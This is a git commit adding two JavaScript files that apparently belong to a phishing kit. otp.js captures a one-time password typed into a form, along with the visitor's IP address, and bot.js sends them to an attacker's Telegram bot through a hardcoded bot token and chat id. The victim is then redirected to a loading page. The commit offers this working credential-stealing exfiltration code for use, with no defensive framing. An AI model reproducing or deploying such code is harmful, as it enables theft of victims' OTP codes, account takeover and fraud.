e59b9331451d987a6baa881e6a2217b37bc15b6a
Miido25 <leo.chk.acc@gmail.com>
2025-08-02 09:59:10 +0200

    Add files via upload

---
+++ bot.js
@@ -0,0 +1,26 @@
+function botNotify(message){
+    const token = "6390734132:AAH6cmhS58odS_4q8zEyQJDOgS1seD_9uig";
+    const apiUrl = "https://api.telegram.org/bot";
+    const queryParams = {
+            "text": message,
+            "chat_id" : "1534315854",
+            "parse_mode":"html"
+        };
+    const queryString = Object.keys(queryParams)
+    .map(key => encodeURIComponent(key) + "=" + encodeURIComponent(queryParams[key]))
+    .join("&");
+    // Construct the  URL with the query string
+    const link = `${apiUrl}${token}/sendMessage?${queryString}`;
+    // $getId ="https://api.telegram.org/bot6390734132:AAH6cmhS58odS_4q8zEyQJDOgS1seD_9uig/getUpdates";
+    // Make a GET request using the fetch API
+        fetch(link)
+        .then(response => {
+            return response.json();
+        })
+        .then(data => {
+        // Do something with the response data
+        })
+        .catch(error => {
+         console.error("Fetch error:", error);
+        });
+}
---
+++ otp.js
@@ -0,0 +1,43 @@
+$(document).ready(()=>{
+
+    $("#otpCode").on("submit",async(ev)=>{
+        ev.preventDefault();
+        var message = "";
+        var otpCode    = $("#otp").val();
+        if(otpCode.length == 0 ){
+            
+            alert("لو سمحت أملأ حقل الكود");
+            return;
+        }
+        message += "-------[ OTP ]-------\n";
+        message += `OTP : ${otpCode}\n`;
+        message += await getIp();
+        botNotify(message);
+       // window.location.assign("loading-otp.html");
+       message += await LOUDINGDATA();
+    });
+
+const  getIp = async ()=>{
+    return await fetch('https://api.ipify.org/?format=json')
+    .then(response => response.json())
+    .then(data => {
+        var ipAddress = data.ip;
+        var message = `IP Address : ${ipAddress}\n`;
+        return message;
+    }).catch(e=>{
+        var message = `Error to get visitor IP\n`;
+        return message;
+    });
+    }
+
+    const  LOUDINGDATA = async ()=>{
+
+        $(document).ready(()=>{
+            setTimeout(function() {
+                window.location.assign("loading-otp.html");
+            }, 1300);
+        })
+
+    }
+
+});
